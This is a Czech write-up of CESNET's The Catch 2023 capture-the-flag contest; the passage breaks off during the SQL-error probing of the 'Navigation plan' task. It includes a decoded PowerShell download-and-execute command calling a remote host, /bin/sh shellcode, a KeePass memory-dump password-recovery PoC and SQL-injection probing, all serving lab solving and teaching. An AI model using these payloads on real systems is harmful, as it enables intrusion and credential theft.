# The Catch 2023

Podobně jako předchozí roky, tak i letos CESNET uspořádal tradiční podzimní CTF
[The Catch](https://www.thecatch.cz/). V jednotlivých úlohách/výzvách bylo cílem
vždy získat "vlajku" – ukrytý kód skrývající se v různých podobách buď v
hacknutelných systémech nebo ve stažených souborech, všechno nějakým způsobem
imitující "hackování".

Povedlo se mi nakonec získat vlajku v 17 z 18 úloh a níže je můj write-up
popisující můj přístup k řešení každé úlohy.

* [Sailor training center](#sailor-training-center)
  + [VPN access (1/1 bod)](#vpn-access-11-bod)
  + [Treasure map (1/1 bod)](#treasure-map-11-bod)
  + [Captain's coffee (1/1 bod)](#captains-coffee-11-bod)
  + [Ship web server (1/1 bod)](#ship-web-server-11-bod)
* [Crew drills](#crew-drills)
  + [Sonar logs (2/2 body)](#sonar-logs-22-body)
  + [Regular cube (2/2 body)](#regular-cube-22-body)
  + [Web protocols (2/2 body)](#web-protocols-22-body)
  + [Alpha-Zulu quiz (3/3 body)](#alpha-zulu-quiz-33-body)
* [Troubles on the bridge](#troubles-on-the-bridge)
  + [Captain's password (2/2 body)](#captains-password-22-body)
  + [Navigation plan (3/3 body)](#navigation-plan-33-body)
  + [Keyword of the day (4/4 body)](#keyword-of-the-day-44-body)
  + [Signal flags (5/5 bodů)](#signal-flags-55-bodů)
* [Below deck troubles](#below-deck-troubles)
  + [Cat code (3/3 body)](#cat-code-33-body)
  + [Component replacement (3/3 body)](#component-replacement-33-body)
  + [U.S.A. (5/5 body)](#usa-55-body)
  + [Suspicious traffic (5/5 bodů)](#suspicious-traffic-55-bodů)
* [Miscellaneous](#miscellaneous)
  + [Naval chef's recipe (2/2 bodů)](#naval-chefs-recipe-22-bodů)
  + [Arkanoid (0/5 bodů)](#arkanoid-05-bodů)

## Sailor training center

### VPN access (1/1 bod)

> Ahoy, deck cadet,
>
> a lot of ship systems is accessible only via VPN. You have to install
> and configure OpenVPN properly. Configuration file can be downloaded
> from CTFd's link VPN. Your task is to activate VPN and visit the
> testing page.
>
> May you have fair winds and following seas!
>
> Testing page is available at http://vpn-test.cns-jv.tcc.

Podobně jako [loni](https://github.com/setnicka/thecatch2022), taková prerekvizita
pro mnoho dalších úloh. Stačilo si stáhnout vygenerovanou konfiguraci pro OpenVPN,
spustit OpenVPN a přečíst si vlajku na stránce na výše uvedené doméně.

S DNS byl opět na Linuxu drobný problém, je potřeba DNS server poskytnutý
po připojení OpenVPN serverem přidat do systémového resolveru, což je ve Windows
automatické, v Linuxu kvůli rozmanitosti systémů bohužel ne. Ale naštěstí má
většina distribucí jako součást instalace OpenVPN i sbírku skriptů a stačí tak
do konfigurace dopsat jejich zavolání (`up` je akce při spuštění VPN, `down`
zase akce při vypnutí):

```conf
script-security 2
up /etc/openvpn/update-resolv-conf
down /etc/openvpn/update-resolv-conf
down-pre
```

Pak už jen spustíme OpenVPN a přečteme si vlajku:

```sh
$ sudo openvpn --config ctfd_ovpn.ovpn
$ curl -s http://vpn-test.cns-jv.tcc | grep -i flag
 <h1>Confirmation code: <tt>FLAG{smna-m11d-hhta-ONOs}</tt></h1>
```

### Treasure map (1/1 bod)

> Ahoy, deck cadet,
>
> working with maps and searching for treasures is every sailor's daily routine,
> right? Your task is to examine the map and find any hidden secrets.
>
> May you have fair winds and following seas!
>
> Download the [treasure map](https://owncloud.cesnet.cz/index.php/s/mEUTtvkE8zsgZVf/download).

Na zadaném odkazu je PNG obrázek pirátské mapy, na které jsou lehce znát písmenka.
Abychom se při čtení netrápili, tak v GIMPu vybereme jednolitě barevné pozadí
(s nastavením prahu na 0, abychom nevybrali nic jiného) a změníme mu barvu, aby
se nám pak vlajka lépe četla:

| Původní mapa                          |  Začerněná mapa                         |
| ------------------------------------- | --------------------------------------- |
| ![](01_Treasure_Map/treasure_map.png) | ![](01_Treasure_Map/treasure_map_2.png) |

Pak už jen čteme `FLAG{WIFI-AHEA-DCAP-TAIN}`.

### Captain's coffee (1/1 bod)

> Ahoy, deck cadet,
>
> your task is to prepare good coffee for captain. As a cadet, you are
> prohibited from going to the captain's cabin, so you will have to solve the
> task remotely. Good news is that the coffee maker in captain's cabin is online
> and can be managed via API.
>
> May you have fair winds and following seas!
>
> Coffee maker API is available at http://coffee-maker.cns-jv.tcc.

Toto byla jednoduchá úložka na práci s [RESTovým API](https://cs.wikipedia.org/wiki/REST),
taková rozcvička. Na adrese ze zadání dostaneme JSON, který nám radí podívat se na dokumentaci:

```sh
$ curl http://coffee-maker.cns-jv.tcc/
{"status":"Coffemaker ready","msg":"Visit /docs for documentation"}
```

Po návštěvě `/docs` pak dostáváme [OpenAPI specifikaci](06_Captains_coffee/openapi.json),
ve které se dozvíme o několika zajímavých endpointech, především `GET /coffeeMenu`
a pak `POST /makeCoffee`. Tak zjistíme, co za kávu nabízejí, a zkusíme nějakou
připravit.

```sh
curl http://coffee-maker.cns-jv.tcc/coffeeMenu | jq
```
```json
{
  "Menu": [
    {
      "drink_name": "Espresso",
      "drink_id": 456597044
    },
    {
      "drink_name": "Lungo",
      "drink_id": 354005463
    },
    {
      "drink_name": "Capuccino",
      "drink_id": 234357596
    },
    {
      "drink_name": "Naval Espresso with rum",
      "drink_id": 501176144
    }
  ]
}
```

Až potuď by úlohu šlo vyřešit i v browseru, ale pro ruční poslání POST requestu
je nejjednodušší asi použít `curl`. Abychom nemuseli zkoušet všechny kávy, tak
si můžeme pomocí `jq` vysekat jen jejich `drink_id` a pak pro každé z nich
zkusit připravit kávu.

Jak vzápětí zjistíme, tak by stačilo vybrat si jakékoliv `drink_id`, protože
na všechny dostaneme stejnou odpověď s vlajkou :)

```sh
curl -s http://coffee-maker.cns-jv.tcc/coffeeMenu | jq '.Menu.[].drink_id' | while read id; do
        curl -X POST -H 'Content-Type: application/json' http://coffee-maker.cns-jv.tcc/makeCoffee/ -d "{\"drink_id\": $id}" | jq;
done
```
```json
{
  "message": "Your Naval Espresso with rum is ready for pickup",
  "validation_code": "Use this validation code FLAG{ccLH-dsaz-4kFA-P7GC}"
}
```

### Ship web server (1/1 bod)

> Ahoy, deck cadet,
>
> there are rumors that on the ship web server is not just the official
> presentation. Your task is to disprove or confirm these rumors.
>
> May you have fair winds and following seas!
>
> Ship web server is available at http://www.cns-jv.tcc.
>
> Hint: Check the content of the certificate of the web.

Další rozcvičková úloha, ale už o krapet složitější. V zadání dostáváme adresu,
která nás přesměruje na svou HTTPS verzi podepsanou neznámým certifikátem.
Certifikát ani nemůže být validní, protože pro TLD `.tcc` běžící jenom za VPNkou
by ho asi žádný velký vydavatel certifikátů nevydal a nezaručil se za něj.
V rámci řešení CTFka ale můžeme s opatrností pokračovat.

Zobrazí se nám stránka, která v patičce má `ver. RkxBR3sgICAgLSAgICAtICAgIC0gICAgfQ==`.
To nápadně připomíná [base64 enkódování](https://cs.wikipedia.org/wiki/Base64),
zkusme si ho přeložit na text:

```sh
$ echo "RkxBR3sgICAgLSAgICAtICAgIC0gICAgfQ==" | base64 -d
FLAG{    -    -    -    }
```

To vypadá zajímavě, ale části vlajky nám scházejí. Hint nám však radí, abychom
prozkoumali certifikát. A vskutku, certifikát je vydaný i pro několik dalších
domén:

* documentation.cns-jv.tcc
* home.cns-jv.tcc
* pirates.cns-jv.tcc
* structure.cns-jv.tcc

Žádná z nich se bohužel neresolvuje na IP adresu, ale pokud je certifikát vydaný
pro více domén, tak to může znamenat, že všechny běží na tom stejném stroji.
Použijeme tedy IP adresu stroje z funkční domény, ale v `Host` HTTP hlavičce
mu předáme ostatní domény. To jde udělat pomocí `curl` například jako níže
(namísto IP adresy `www.cns-jv.tcc` můžeme rovnou zadat tuto doménu).

Na každém webu je nějaká stránka opět s base64 verzí uvedenou někde na ní.
Vhodným použitím příkazů `grep`, `sed` a `base64` tak vytáhneme části vlajky:

```sh
$ curl -s -H "Host: home.cns-jv.tcc" -k https://www.cns-jv.tcc/style.css | sed 's/.*"ver. \(.*\)".*/\1/' | base64 -d
FLAG{    -    -    -gMwc}
$ curl -s -H "Host: home.cns-jv.tcc" -k https://www.cns-jv.tcc/?user=abc | grep ">ver\. " | sed 's/.*>ver. \(.*\)<.*/\1/' | base64 -d
FLAG{ejii-    -    -    }j
$ curl -s -H "Host: pirates.cns-jv.tcc" -k https://www.cns-jv.tcc/ | grep ">ver\. " | sed 's/.*>ver. \(.*\)<.*/\1/' | base64 -d
FLAG{    -    -Q53C-    }
$ curl -s -H "Host: structure.cns-jv.tcc" -k https://www.cns-jv.tcc/ | grep ">ver\. " | sed 's/.*>ver. \(.*\)<.*/\1/' | base64 -d
FLAG{    -plmQ-    -    }
```

… a finálně složíme `FLAG{ejii-plmQ-Q53C-gMwc}`. Toto už byla první zajímavější
úloha a předzvěst narůstající obtížnosti.

## Crew drills

### Sonar logs (2/2 body)

> Ahoy, officer,
>
> each crew member must be able to operate the sonar and understand its logs.
> Your task is to analyze the given log file, and check out what the sonar has
> seen.
>
> May you have fair winds and following seas!
>
> Download [the logs](https://owncloud.cesnet.cz/index.php/s/5ZpEExdDf4ZBW1E/download).
>
> Update: Be aware that some devices do not use up-to-date libraries - this
> sonar, for example, is based on python and uses an old `pytz` library version
> 2020.4.

Stáhneme si soubor [`sonar.log`](09_Sonar_logs/sonar.log) a podíváme se do něj:

```
2023-10-01 22:51:22 Pacific/Honolulu - Transmitters activated
2023-10-02 00:32:51 US/Pacific - Receiver 5 up
2023-10-02 00:33:45 America/Vancouver - Preprocessor up
2023-10-02 00:52:22 America/Creston - Object detected in depth 65 (0x41)
2023-10-02 01:30:48 America/Belize - Power generator up
2023-10-02 01:34:28 America/Inuvik - Graphical UI up
2023-10-02 01:34:59 America/Mazatlan - Transmitters activated
2023-10-02 01:42:58 Mexico/BajaSur - Transmitters activated
2023-10-02 01:49:54 US/Pacific - Object detected in depth 114 (0x72)
...
```

Každá řádka logu obsahuje časový údaj včetně časové zóny. Jsou teď seřazené
lexikograficky, ale nejsou seřazené správně podle času s ohledem na časové zóny.
Pak je zde spousta balastu a pak řádky logu, které nesou ještě další informaci – hloubku
v číslech mezi 45 a 125. Cvičenému hackerovi to okamžitě evokuje, že by hloubky
mohly být čísla písmen (a znaků `-`, `{` a `}`) v [ASCII tabulce](https://cs.wikipedia.org/wiki/ASCII).

Než ale záznamy řadit ručně a pak ještě převádět čísla na písmenka, tak si na to
radši napíšeme krátký prográmek v Pythonu. Zde pak přijde vhod hint, že pro
převod názvů časových pásem máme použít [pytz](https://pypi.org/project/pytz/)
knihovnu verze 2020.4, protože názvy časových pásem v ní se dost měnily
(bohužel `pytz` nepoužívá moc standardizované názvy).

Abychom si mohli pořídit správnou verzi knihovny, i když už máme v systému novější,
tak si pořídíme Python venv (virtual environment), kde si můžeme verzi knihovny
nadiktovat (pokud je tato verze na [PyPI](https://pypi.org/)).

Vyrobíme si soubor [`requirements.txt`](09_Sonar_logs/requirements.txt) a pak
založíme venv a instalujeme do něj správnou verzi:

```sh
$ cat requirements.txt
pytz==2020.4
python-dateutil

# Vyrobení prázdného venv ve složce venv
$ python3 -m venv venv

# Aktivujeme venv, od této chvíle příkazy jako python3 a pip3 operují s ním
$ . venv/bin/activate

# Instalace balíčků
(venv) $ pip3 install -r requirements.txt
```

Pak si napíšeme skript, který načte všechny řádky logu, naparsuje je, seřadí
podle času a převede na písmenka: [`solve.py`](09_Sonar_logs/solve.py)

```sh
(venv) $ python3 solve.py < sonar.log
FLAG{3YAG-2rbj-KWoZ-LwWm}
```

### Regular cube (2/2 body)

> Ahoy, officer
>
> knowledge of regular expressions is crucial for all sailors from CNS fleet. A
> 3D crossword puzzle is available to enhance this skill.
>
> May you have fair winds and following seas!
>
> Download [the regular cube crossword](https://owncloud.cesnet.cz/index.php/s/xfEjEaKkAuSVmPB/download).

Na uvedeném odkazu stáhneme soubor [`regular_cube.pdf`](10_Regular_cube/regular_cube.pdf),
což je 3D křížovka s [regulárními výrazy](https://cs.wikipedia.org/wiki/Regul%C3%A1rn%C3%AD_v%C3%BDraz)
(aneb regexy) pro každý řádek/sloupec ve všech třech osách.

Dá se postupovat od těch jasných regexů a postupně doplňovat. Na počítači
doporučuji na doplňování [Xournal++](https://github.com/xournalpp/xournalpp).

Moje řešení:

* [`regular_cube.xopp`](10_Regular_cube/regular_cube.xopp)
* [`regular_cube_solve.pdf`](10_Regular_cube/regular_cube_solve.xopp)

Nakonec vyšla tajenka, která je tentokrát (pro vyvarování se náhodných hloupých
chybiček) docela normální text: `FLAG{NICE-NAVY-BLUE-CUBE}`.

### Web protocols (2/2 body)

> Ahoy, officer,
>
> almost all interfaces of the ship's systems are web-based, so we will focus
> the exercise on the relevant protocols. Your task is to identify all webs on
> given server, communicate with them properly and assembly the control string
> from responses.
>
> May you have fair winds and following seas!
>
> The webs are running on server `web-protocols.cns-jv.tcc`.
>
> Hint: Be aware that `curl` tool doesn't do everything it claims.

Tato úloha mě potrápila jako jedna z nejvíce.

První věc, kterou můžeme udělat, když dostaneme adresu, je podívat se, co na
počítači za touto adresou vlastně běží. Můžeme zkusit otevřít spojení na všechny
jeho TCP porty nástrojem `nmap`, cím zjistíme, na kterých portech je nám počítač
ochotný odpovědět. Často se z toho dá zjistit, jaké všechny služby tam běží.

Protože `nmap` normálně skenuje jen nejpoužívanější porty, tak mu ještě
pomocí přepínače `-p` vysvětlíme, co má skenovat (`-` je celý rozsah od 0 do 65535):

```sh
$ nmap -p- web-protocols.cns-jv.tcc
PORT     STATE SERVICE
5009/tcp open  airport-admin
5011/tcp open  telelpathattack
5020/tcp open  zenginkyo-1
8011/tcp open  unknown
8020/tcp open  intu-ec-svcdisc
```

Zkusíme na ně postupně poslat curl, abychom zjistili, jestli na nich běží
nějaký web (když se úloha jmenuje "Web protocols"). Na většině z nich dostaneme
nějaké obrázky kódované v base64:

```sh
$ curl -s http://web-protocols.cns-jv.tcc:5009
Unsupported protocol version

$ curl -s http://web-protocols.cns-jv.tcc:5011 | base64 -d | file -
/dev/stdin: PNG image data, 1920 x 1920, 8-bit/color RGBA, non-interlaced
# base64 encoded obrázek 2 koček (md5sum 67d46a3428164097d498759f999bbaed)
# podle hlaviček Python/werkzeug

$ curl -s http://web-protocols.cns-jv.tcc:5020 | base64 -d | file -
/dev/stdin: PNG image data, 1920 x 1920, 8-bit/color RGBA, non-interlaced
# base64 encoded obrázek 3 koček (md5sum 403b24ed73b4ea06ce23c001a04a176d)
# podle hlaviček Python/werkzeug

$ curl -s http://web-protocols.cns-jv.tcc:8011 | base64 -d | file -
/dev/stdin: PNG image data, 1920 x 1920, 8-bit/color RGBA, non-interlaced
# znovu base64 encoded obrázek 2 koček (md5sum 67d46a3428164097d498759f999bbaed)
# podle hlaviček nginx

$ curl -s -k https://web-protocols.cns-jv.tcc:8020/ | base64 -d | file -
/dev/stdin: PNG image data, 1920 x 1920, 8-bit/color RGBA, non-interlaced
# zabezpečený base64 encoded obrázek 3 koček (md5sum 403b24ed73b4ea06ce23c001a04a176d)
# podle hlaviček nginx
```

Z obrázků nic moc nevykoukáme, nanejvýše odhadneme, že nám ještě asi chybí
obrázek s jednou kočkou. Všimneme si ale cookies, které nám přišly nazpátek
v hlavičce `Set-Cookie`:

```sh
$ curl -v http://web-protocols.cns-jv.tcc:5011 2>&1 >/dev/null | grep -i Set-Cookie
< Set-Cookie: SESSION=LXJ2YnEtYWJJ; Path=/
$ curl -v http://web-protocols.cns-jv.tcc:5020 2>&1 >/dev/null | grep -i Set-Cookie
< Set-Cookie: SESSION=Ui00MzNBfQ==; Path=/
$ curl -v http://web-protocols.cns-jv.tcc:8011 2>&1 >/dev/null | grep -i Set-Cookie
< Set-Cookie: SESSION=LXJ2YnEtYWJJ; Path=/
$ curl -vk https://web-protocols.cns-jv.tcc:8020 2>&1 >/dev/null | grep -i Set-Cookie
< set-cookie: SESSION=Ui00MzNBfQ==; Path=/
```

* `LXJ2YnEtYWJJ` je base64 encoded `-rvbq-abI`
* `Ui00MzNBfQ==` je base64 encoded `R-433A}`

Schází nám ještě první část vlajky, zatím máme `FLAG{....-rvbq-abIR-433A}`.

Další věcí, které si můžeme všimnout, je to, že Python servery odpovídají
protokolem HTTP/1.0, Nginx pak HTTP/1.1 a HTTP/2, nemůže ten první endpoint být
[původní HTTP, dnes nazývané HTTP/0.9](https://www.w3.org/Protocols/HTTP/AsImplemented.html)?
To neposílalo v requestu žádnou verzi a request tak vypadal jen jako `GET /cesta`
(narozdíl třeba od HTTP/1.1, kde vypadá jako `GET /cesta HTTP/1.1`).

Protože `curl` podle hintu HTTP/0.9 neposílá správně, tak to můžeme udělat ručně
přes netcat třeba takto:

```sh
$ echo "GET /" | nc 10.99.0.122 5009
HTTP/1.1 400 Bad Request

Unsupported protocol version
```

Až sem byla úloha velmi hezká. Ale bohužel po vyzkoušení tohoto a obdržení
výše uvedené odpovědi jsem po dlouhém snažení úlohu odložil k ledu a vrátil se
k ní až později. Endpoint totiž odpovídal tak, jako kdyby provozoval HTTP/1.1,
ale ať do něj člověk posílá cokoliv, odpovídá mu v podstatě vždy stejně.

Až po mnoha pokusech a asi třetímu navrácení k úloze jsem si řekl, co když to
autoři udělali blbě a stvořili protokol, který nikdy neexistoval? A ano!

```sh
$ echo "GET / HTTP/0.9" | nc 10.99.0.122 5009
HTTP/0.9 200 OK

SESSION=RkxBR3trckx0; iVBORw0KGgoA...
# data jsou obrázek s jednou kočkou
```

Rád bych ale řekl, že nic takového nikdy v historii neexistovalo a úloha byla
kvůli tomu dost matoucí a nemám z ní moc dobré pocity, i když mohla být
skutečně hezká :(

Finálně pak už jen dekódujeme `RkxBR3trckx0`, získáme `FLAG{krLt` a sestavíme
celou vlajku: `FLAG{krLt-rvbq-abIR-433A}`

| HTTP/0.9 kočka                 | HTTP/1.1 kočky                 | HTTP/2.0 kočky                 |
| ------------------------------ | ------------------------------ | ------------------------------ |
| ![](11_Web_protocols/5009.png) | ![](11_Web_protocols/5011.png) | ![](11_Web_protocols/5020.png) |

### Alpha-Zulu quiz (3/3 body)

> Ahoy, officer
>
> your task is to pass a test that is part of the crew drill. Because of your
> rank of third officer, you must lead the crew by example and pass the test
> without a single mistake.
>
> May you have fair winds and following seas!
>
> The quiz webpage is available at <http://quiz.cns-jv.tcc>.

Na uvedené URL byl kvíz, který vždy ukázal část nějakého souboru nebo obecně
datového formátu a úkolem bylo vždy správně zvolit odpověď ze čtyř nabízených.
Teprve až po zodpovězení všech 20 otázek správně se zobrazila vlajka `FLAG{QOn7-MdEo-9cuH-aP6X}`.

Užitečné odkazy:

* [Seznam signatur běžných souborů](https://en.wikipedia.org/wiki/List_of_file_signatures) na Wikipedii

**JSON Web Token (JWT):**

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkRvZSBKb2huIiwiaWF0IjoxNTE2MjM5MDIyfQ.Aqma4g_FzStCaLSyvpRgKLNIgM4now17FXwSHsBlwag
```

Po base64 dekódování první části z toho vypadne `{"alg":"HS256","typ":"JWT"}`.

**WordPress hash:**

```
$P$BlW9FsUwJM0142LDsjtDsPUBHPVPIf/
```

Je to na první pohled nějaký hash hesla (na začátku pomocí `$` oddělený nějaký
parametr). Po chvíli hledání možností lze najít ukázky WordPress hashů
vypadající podobně.

**ZIP archive:**

```
00000000  50 4b 03 04 14 00 00 00 08 00 39 9b c7 56 db 90  |PK........9.ÇVÛ.|
00000010  a9 3d 19 00 00 00 10 00 00 00 08 00 00 00 66 69  |©=............fi|
00000020  6c 65 2e 74 78 74 05 40 b1 09 00 30 0c 7a c5 d7  |le.txt.@±..0.zÅ×|
00000030  84 b8 45 5a 30 ef 0f 92 67 21 f4 5f 61 78 2c 50  |.¸EZ0ï..g!ô_ax,P|
00000040  4b 01 02 14 00 14 00 00 00 08 00 39 9b c7 56 db  |K..........9.ÇVÛ|
00000050  90 a9 3d 19 00 00 00 10 00 00 00 08 00 00 00 00  |.©=.............|
00000060  00 00 00 00 00 00 00 00 00 00 00 00 00 66 69 6c  |.............fil|
00000070  65 2e 74 78 74 50 4b 05 06 00 00 00 00 01 00 01  |e.txtPK.........|
00000080  00 36 00 00 00 3f 00 00 00 00 00                 |.6...?.....|
# ZIP archive
```

Je to hexdump, vlevo jsou adresy, uprostřed bajty zapsané hexadecimálně, napravo
přepis do ASCII. Podle prvních dvou bajtů `PK` je to ZIP archiv.

**Windows PE executable:**

```
00000000: 4d5a 9000 0300 0000 0400 0000 ffff 0000  MZ..............
00000010: b800 0000 0000 0000 4000 0000 0000 0000  ........@.......
00000020: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000030: 0000 0000 0000 0000 0000 0000 8000 0000  ................
00000040: 0e1f ba0e 00b4 09cd 21b8 014c cd21 5468  ........!..L.!Th
```

Opět hexdump, jen jinak seskupený (výstup z jiného programu). Podle prvních
několika bajtů identifikujeme PE executable.

**ELF binary:**

```
00000000: 7f45 4c46 0201 0100 0000 0000 0000 0000  .ELF............
00000010: 0300 3e00 0100 0000 7033 0000 0000 0000  ..>.....p3......
00000020: 4000 0000 0000 0000 f8b1 0000 0000 0000  @...............
00000030: 0000 0000 4000 3800 0d00 4000 1e00 1d00  ....@.8...@.....
00000040: 0600 0000 0400 0000 4000 0000 0000 0000  ........@.......
00000050: 4000 0000 0000 0000 4000 0000 0000 0000  @.......@.......
00000060: d802 0000 0000 0000 d802 0000 0000 0000  ................
```

Hexdump, v prvních několika bajtech na nás přímo vykoukne název ELF.

**Microsoft EVTX file signature:**

```
0000000: 456c 6646 696c 6500 0000 0000 0000 0000  ElfFile.........
0000010: d300 0000 0000 0000 375e 0000 0000 0000  ........7^......
```

Opět hexdump, šlo poznat podle začátku souboru.

**UTF-16 Little Endian encoded data:**

```
00000000  49 00 45 00 58 00 28 00 4e 00 65 00 77 00 2d 00  |I.E.X.(.N.e.w.-.|
00000010  4f 00 62 00 6a 00 65 00 63 00 74 00 20 00 4e 00  |O.b.j.e.c.t. .N.|
00000020  65 00 74 00 2e 00 57 00 65 00 62 00 43 00 6c 00  |e.t...W.e.b.C.l.|
00000030  69 00 65 00 6e 00 74 00 29 00 2e 00 64 00 6f 00  |i.e.n.t.)...d.o.|
00000040  77 00 6e 00 6c 00 6f 00 61 00 64 00 53 00 74 00  |w.n.l.o.a.d.S.t.|
00000050  72 00 69 00 6e 00 67 00 28 00 27 00 68 00 74 00  |r.i.n.g.(.'.h.t.|
00000060  74 00 70 00 3a 00 2f 00 2f 00 31 00 30 00 2e 00  |t.p.:././.1.0...|
00000070  31 00 30 00 2e 00 31 00 34 00 2e 00 33 00 31 00  |1.0...1.4...3.1.|
00000080  2f 00 73 00 68 00 65 00 6c 00 6c 00 2e 00 70 00  |/.s.h.e.l.l...p.|
00000090  73 00 31 00 27 00 29 00                          |s.1.'.).|
```

UTF-16 kóduje každé písmeno do dvou bajtů (16 bitů), takže podle pravé části
hexdumpu je hned vidět, že je to UTF-16.

**Java Serialized hex stream:**

```
ac ed 00 05 75 72 00 13 5b 4c 6a 61 76 61 2e 6c
61 6e 67 2e 53 74 72 69 6e 67 3b ad d2 56 e7 e9
1d 7b 47 02 00 00 78 70 00 00 00 02 74 00 21 44
3a 2f 77 69 6e 33 32 61 70 70 2f 61 70 6c 69 63
61 74 69 6f 6e 2f 62 69 6e 61 72 79 2e 65 78 65
74 00 09 2d 2d 76 65 72 73 69 6f 6e
```

Hexadecimální data. Podle prvních dvou bajtů lze dohledat.

**Base64 encoded data:**

```sh
$ echo 'dGhpc2lzYXRlc3RzdHJpbmcx' | base64 -d
thisisateststring1
```

**Base32 encoded data:**

```sh
$ echo 'ORUGS43JONQXIZLTORZXI4TJNZTTC===' | base32 -d
thisisateststring1
```

**XOR obfuscated string:**

```
00000000  41 4c 41 0c 51 47 50 54 47 50 0c 46 4d 4f 43 4b  |ALA.QGPTGP.FMOCK|
00000010  4c 0c 58 4b 52 18 16 16 11                       |L.XKR....|
```

**Timestamp:**

`1609549323` -> Saturday 2. January 2021 1:02:03

**PHP serialized object:**

```
O:8:"MyClass":2:{s:4:"name";s:9:"John Doe";s:3:"age";i:25;}`
```

Serializace v PHP je docela přímočará, `O` je objekt, `8` je délka názvu včetně
nullbyte na konci a tak dále.

**Linux x86 shellcode:**

```
\x31\xc0\x50\x68\x2f\x2f\x53\x48\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
```

**GZip hex stream:**

```sh
$ echo '1f 8b 08 00 4f bd 80 64 00 ff 05 40 b1 09 00 30 0c 7a c5 d7 84 b8 45 5a 30 ef 0f 92 67 21 f4 5f 61 78 2c db 90 a9 3d 10 00 00 00' | xxd -r -p | file -
/dev/stdin: gzip compressed data, last modified: Wed Jun  7 17:24:31 2023
```

Tady jsme si pomohli utilitkou `xxd`, která z hexadecimálního zápisu udělala
nazpět binární data a pak jsme je poslali do utilitky `file`, která poznává
soubory podle jejich začátku.

**.NET ViewState value:**

```sh
echo '/wEPDwULLTE2MTY2ODcyMjkPFgQeCFVzZXJOYW1lBQ5EYXNndXB0YSBTaHViaB4IUGFzc3dvcmQFDElBbUFQYXNzd29yZGRk2/xP37hKKE9jfGYYzFjLuwpi6rHlPdXhfSspF6YRZiI=' | base64 -d
�
 -161668722UserNameDasgupta ShubPassword
                                        IAmAPassworddd��O߸J(Oc|f�X˻
b��=��}+)�f"
# .NET ViewState value
```

Na první pohled base64 zakódovaná data, z výstupu pak šlo odhadnout, že nic
jiného to být nemůže.

**Encoded PowerShell command:**

```sh
$ echo 'SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADMAMQAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=' | base64 -d
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.31/shell.ps1')
```

Opět base64 zakódovaná data, výstup pak byl opět jasný.

**SHA1 a MD5:**

* `40bd001563085fc35165329ea1ff5c5ecbdbbeef` -> SHA1 (správná délka)
* `202cb962ac59075b964b07152d234b70` -> MD5 sum (správná délka)

**Java Serialized data:**

```sh
$ echo 'rO0ABXVyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAJ0ACFEOi93aW4zMmFwcC9hcGxpY2F0aW9uL2JpbmFyeS5leGV0AAktLXZlcnNpb24=' | base64 -d
��ur[Ljava.lang.String;��V��{Gxpt!D:/win32app/aplication/binary.exet	--version
```

Po dekódování z base64 šlo poznat.

## Troubles on the bridge

### Captain's password (2/2 body)

> Ahoy, officer,
>
> our captain has had too much naval espresso and is temporary unfit for duty.
> The chief officer is in command now, but he does not know the captain's
> passwords for key ship systems. Good news is that the captain uses password
> manager and ship chief engineer was able to acquire captain's computer memory
> crash dump. Your task is to acquire password for signalization system.
>
> May you have fair winds and following seas!
>
> Download the [database and memory dump](https://owncloud.cesnet.cz/index.php/s/LhKWx4kA8xWQq25/download).

Ze staženého souboru na nás vypadne KeePass file (password manager)
[`captain.kdbx`](12_Captains_password/captain.kdbx) a pak taky
asi gigový dump paměti. Když si instalujeme KeePass a zkusíme soubor načíst, tak
po nás samozřejmě chce master password. Musíme ho zjistit.

Po chvilce hledání lze přijít na to, že KeePass má známý exploit související s tím,
jak pracuje s textovým políčkem při zadávání hesla. Při každém stisku klávesy do
něj totiž přibude písmeno, ale KeePass ho hned změní na `●`. Bohužel kvůli
práci se stringy okolo tohoto textového políčka ale v paměti zůstávají stringy
s nějakým počtem `●` a s napsaným písmenem na konci:

<https://www.bleepingcomputer.com/news/security/keepass-exploit-helps-retrieve-cleartext-master-password-fix-coming-soon/>

Je dostupný i [PoC k tomuto útoku](https://github.com/vdohney/keepass-password-dumper),
tak ho zkusíme na náš memory dump:

```sh
git clone https://github.com/vdohney/keepass-password-dumper
cd keepass-password-dumper/
dotnet run /tmp/crashdump.dmp
```

Vypadne z toho `Combined: ●{), ÿ, a, :, |, í, W, 5, \n, r, ¸}ssword4mypreciousship`,
vypadá to na `password4mypreciousship`. A funguje!

V KeePass souboru je dost hesel, zajímá nás ale to k Main Flag System, které má
nápadně známý tvar: `FLAG{pyeB-941A-bhGx-g3RI}`

### Navigation plan (3/3 body)

> Ahoy, officer,
>
> the chief officer was invited to a naval espresso by the captain and now they
> are both unfit for duty. The second officer is very busy and he has asked you
> to find out where are we heading according to the navigation plan.
>
> May you have fair winds and following seas!
>
> The navigation plan webpage is available at <http://navigation-plan.cns-jv.tcc>.

Na uvedené adrese je web s obrázky lokací CNS Josef Verich, ale nejsou u nich
uvedené informace. Taky je zde po rozkliknutí nabídky možnost na přihlášení,
bohužel neznáme login ani heslo.

Všimneme si, že obrázky jsou loadované přes query argumenty jako třeba
`image.png?type=data&t=targets&id=1`. Pojďme si si tím hrát:

Změníme `id` na 0 a dostaneme namísto obrázku chybu: <http://navigation-plan.cns-jv.tcc/image.png?type=data&t=targets&id=0>
```
<br />
<b>Warning</b>:  Trying to access array offset on value of type null in <b>/var/www/html/image.php</b> on line <b>12</b><br />
<br />
<b>Deprecated</b>:  base64_decode(): Passing null to parameter #1 ($string) of type string is deprecated in <b>/var/www/html/image.php</b> on line <b>12</b><br />
```
-> na řádce 12 se bere něco z výsledků a base64 se to dekóduje

Změníme `t` na `xxx`: <http://navigation-plan.cns-jv.tcc/image.png?type=data&t=xxx&id=1>
```
<br />
<b>Fatal error</b>:  Uncaught mysqli_sql_exception: Table 'navigation.xxx' doesn't exist in /var/www/html/image.php:9
Stack trace:
#0 /var/www/html/image.php(9): mysqli_query(Object(mysqli), 'SELECT data FRO...')
#1 {main}
